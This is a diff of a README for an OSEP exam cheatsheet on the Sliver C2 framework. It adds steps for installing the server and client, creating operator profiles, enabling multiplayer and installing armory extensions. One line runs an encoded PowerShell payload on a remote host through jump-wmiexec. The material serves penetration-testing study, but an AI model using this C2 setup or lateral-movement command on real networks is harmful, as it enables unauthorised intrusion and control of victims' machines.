@@ -1,15 +1,17 @@
-
 # Sliver CheatSheet for OSEP
 
-Considering the documentation of sliver is really bad, thought of creating this repository to help people with usage of Sliver C2 for OSEP. The guide is specific to OSEP but the usage should remain the same for real world projects.
+Creating this repository to help people with usage of Sliver C2 for OSEP. The guide is specific to OSEP but the usage should remain the same for real world projects. It is supposed to be treated as a cheatsheet for when you want to get something done and not want to spend time reading the documentation.
 
-It contains all my notes from the course content and challenge labs and is more than enough to do them and pass the exam. The notes are categorised by initial setup, compromise, privileges escalation, post exploitation and other sections.
+It contains all the notes from the course content and challenge labs and is more than enough to do them and pass the exam. The notes are categorised by initial setup, compromise, privileges escalation, post exploitation and other sections.
 
 The C# and PowerShell files throughout the cheat sheet should be publicly accessible, just search the tool name publicly. I have also compiled many of them during the duration of OSEP prep and have included them within the folder `bins` containing my structure, these would be detected as malicious if downloaded, feel free to download from the public repos and compile them. 
 
 ## Table of Contents
 
-
+- [Installation](#installation)
+	- [Server](#server)
+	- [Client](#client)
+	- [Armory packages](#armory-packages)
 - [Q & A](#q--a)
 - [Listeners](#listeners)
 - [Payloads](#payloads)
@@ -132,8 +134,58 @@ The C# and PowerShell files throughout the cheat sheet should be publicly access
 - [BOFs](#bofs)
 	- [jump-psexec](#jump-psexec)
 	- [jump-wmiexec](#jump-wmiexec)
-	- [Aarmory packages](#aarmory-packages)
+ - [Armory Packages List](#armory-packages-list)
 
+## Installation
+Visit the sliver [releases page](https://github.com/BishopFox/sliver/releases) and install the pre-compiled Server and Client for your OS. Sliver also enables multiple operators to join using profiles since each operator can be generated using a different profile.
+
+### Server
+```bash
+# Install suitable Binary for your OS - Linux in this instance
+wget -q https://github.com/BishopFox/sliver/releases/download/v1.5.42/sliver-server_linux
+chmod +x ./sliver-server_linux
+./sliver-server_linux
+
+
+# Operator profile
+[server] sliver > new-operator -n <operator_name> -l <listening_IP>
+[*] Generating new client certificate, please wait ... 
+[*] Saved new client config to: /<path_to_generated_profile>/<operator_name>_<listening _IP>.cfg 
+
+
+# Enabling Multiplayer mode
+[server] sliver > multiplayer
+[*] Multiplayer mode enabled!
+[*] <operator_name> has joined the game
+```
+
+> **Note**: Without enabling the `multiplayer` mode, no one else will be able to connect to Sliver's server.
+
+### Client
+
+Setting up the Sliver C2 client to connect with the server
+
+```bash
+# Download the sliver client
+wget -q https://github.com/BishopFox/sliver/releases/download/v1.5.42/sliver-client_linux
+chmod +x ./sliver-client_linux
+./sliver-client_linux import /<path_to_generated_profile>/<operator_name>_<listening _IP>.cfg
+
+
+# After importing the profile, start the client
+./sliver-client_linux 
+```
+
+### Armory packages
+[Armory](https://github.com/sliverarmory) contains a set of pre-installed .NET binaries ready to use for the client and server component.
+
+```bash
+sliver > armory install all
+
+? Install 21 aliases and 140 extensions? Yes
+[*] Installing alias 'SharPersist' (v0.0.2) ... done!
+... Complete output at the end ...
+```
 
 ## Q & A
 
@@ -2497,11 +2549,9 @@ jump-wmiexec client09 'powershell -enc KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAd
 ```
 
 
+## Armory Packages List
 
-
-### Aarmory packages
-
-```powershell
+```
 sliver > armory install all
 
 ? Install 21 aliases and 140 extensions? Yes
@@ -2668,5 +2718,6 @@ sliver > armory install all
 [*] Installing extension 'c2tc-klist' (v0.0.9) ... done!
 
 [*] All packages installed
-
 ```
+
+
